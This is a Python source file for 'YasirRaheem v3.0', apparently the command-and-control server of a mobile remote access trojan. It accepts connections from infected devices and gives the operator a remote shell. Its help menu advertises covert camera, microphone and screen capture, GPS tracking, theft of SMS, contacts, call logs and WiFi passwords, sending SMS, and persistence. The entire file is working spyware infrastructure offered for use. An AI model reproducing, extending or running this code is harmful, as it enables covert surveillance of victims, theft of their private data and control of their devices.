#!/usr/bin/env python3
# YasirRaheem v3.0 - Full Control Server
import socket
import threading
import os
import sys

HOST = '0.0.0.0'
PORT = 5555

clients = {}

def handle_client(conn, addr, client_id):
    print(f"\n[+] Client {client_id} connected from {addr}")
    
    while True:
        try:
            cmd = input(f"\033[1;32mYRSH[{client_id}]>\033[0m ").strip()
            
            if cmd == 'exit':
                conn.send(b'exit')
                break
            
            elif cmd == 'help':
                print("""
╔══════════════════════════════════════════════╗
║       YASIRRAHEEM v3.0 - FULL CONTROL       ║
╠══════════════════════════════════════════════╣
║ 📁 FILE SYSTEM                              ║
║  ls [path]     - List files                 ║
║  cd <path>     - Change directory           ║
║  pwd           - Current directory          ║
║  cat <file>    - Read file                  ║
║  download <f>  - Download file              ║
║  upload <f>    - Upload file                ║
║  rm <file>     - Delete file                ║
║  find <name>   - Search files               ║
╠══════════════════════════════════════════════╣
║ 📷 CAMERA & MIC                             ║
║  cam           - Take photo (front)         ║
║  cam_back      - Take photo (back)          ║
║  cam_video <s> - Record video (seconds)     ║
║  mic <sec>     - Record audio               ║
╠══════════════════════════════════════════════╣
║ 📍 LOCATION                                 ║
║  location      - Get GPS location           ║
║  track start   - Start live tracking        ║
║  track stop    - Stop live tracking         ║
╠══════════════════════════════════════════════╣
║ 💬 MESSAGES & CONTACTS                      ║
║  contacts      - All contacts               ║
║  sms           - All SMS inbox              ║
║  sms_send <n>  - Send SMS to number         ║
║  call_log      - Call history               ║
╠══════════════════════════════════════════════╣
║ 📱 DEVICE CONTROL                           ║
║  info          - Complete device info       ║
║  apps          - Installed apps list        ║
║  clipboard     - Clipboard content          ║
║  wifi          - WiFi networks/passwords    ║
║  battery       - Battery status             ║
║  processes     - Running processes          ║
║  toast <msg>   - Show notification          ║
║  vibrate <ms>  - Vibrate device             ║
║  tts <text>    - Text to speech             ║
║  volume <0-15> - Set volume                 ║
║  screenshot    - Take screenshot            ║
║  lock          - Lock screen                ║
║  shell <cmd>   - Custom command             ║
╠══════════════════════════════════════════════╣
║ 🔐 PERSISTENCE                              ║
║  persist       - Add to startup             ║
║  kill          - Remove persistence         ║
╚══════════════════════════════════════════════╝
                """)
            
            elif cmd == '':
                continue
                
            else:
                conn.send(cmd.encode())
                response = b''
                conn.settimeout(5)
                try:
                    while True:
                        chunk = conn.recv(65536)
                        if not chunk:
                            break
                        response += chunk
                        if b'[DONE]' in chunk:
                            response = response.replace(b'[DONE]', b'')
                            break
                except:
                    pass
                conn.settimeout(None)
                
                if response:
                    print(response.decode(errors='ignore'))
                    
        except KeyboardInterrupt:
            print("\n[-] Shutting down...")
            conn.send(b'exit')
            break
        except Exception as e:
            print(f"[-] Error: {e}")
            break
    
    del clients[client_id]
    conn.close()
    print(f"[-] Client {client_id} disconnected")

def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(10)
    
    print(f"""
\033[1;36m
╔══════════════════════════════════════════╗
║    YASIRRAHEEM v3.0 - FULL CONTROL      ║
║    Server: {HOST}:{PORT}                    ║
║    Waiting for connections...            ║
╚══════════════════════════════════════════╝
\033[0m
""")
    
    client_id = 0
    while True:
        conn, addr = s.accept()
        client_id += 1
        t = threading.Thread(target=handle_client, args=(conn, addr, client_id))
        t.daemon = True
        t.start()

if __name__ == '__main__':
    server()
